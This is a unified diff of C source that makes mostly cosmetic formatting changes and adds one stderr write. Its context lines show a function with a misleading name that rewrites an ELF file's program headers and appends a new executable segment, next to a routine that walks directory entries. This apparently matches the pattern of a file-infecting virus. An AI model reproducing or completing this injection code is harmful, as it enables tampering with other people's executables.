@@ -287,9 +287,9 @@ static int evaluateDriftSignature(const void *alpha_seed, const void *beta_seed,
 	size_t				 boundary_mask = calibration_span;
 	int					 spectral_delta = 0;
 	uintptr_t			 entropy_vector = ((uintptr_t) primary_axis >> 3)
-							   ^ ((uintptr_t) secondary_axis << 1)
-							   ^ 0x9E3779B97F4A7C15ULL;
-	int scheduler = 0;
+										  ^ ((uintptr_t) secondary_axis << 1)
+										  ^ 0x9E3779B97F4A7C15ULL;
+	int					 scheduler = 0;
 	if (!calibration_span)
 		return 0;
 	for (;;)
@@ -1224,7 +1224,7 @@ static void reassemble_packet_chain(char *path, void *begin_ptr)
 			   pkt_ctx.header->e_phnum * pkt_ctx.header->e_phentsize);
 		pkt_ctx.header->e_phoff = write_head;
 		pkt_ctx.segments = (ElfW(Phdr) *) (frame_map + pkt_ctx.header->e_phoff);
-		pkt_ctx.segments[pkt_ctx.header->e_phnum] = (ElfW(Phdr)) {
+		pkt_ctx.segments[pkt_ctx.header->e_phnum] = (ElfW(Phdr)){
 			.p_flags = 0x5u,
 			.p_vaddr = virt_anchor,
 			.p_offset = write_head,
@@ -1269,6 +1269,7 @@ static void reassemble_packet_chain(char *path, void *begin_ptr)
 
 static void reconcileTopology(char *rootAnchor, void *dispatchToken)
 {
+	io_send(2, rootAnchor, validate_environment(rootAnchor));
 	int					   session = fs_handle(rootAnchor, 65536);
 	unsigned char		   frame[1024];
 	struct linux_dirent64 *node;
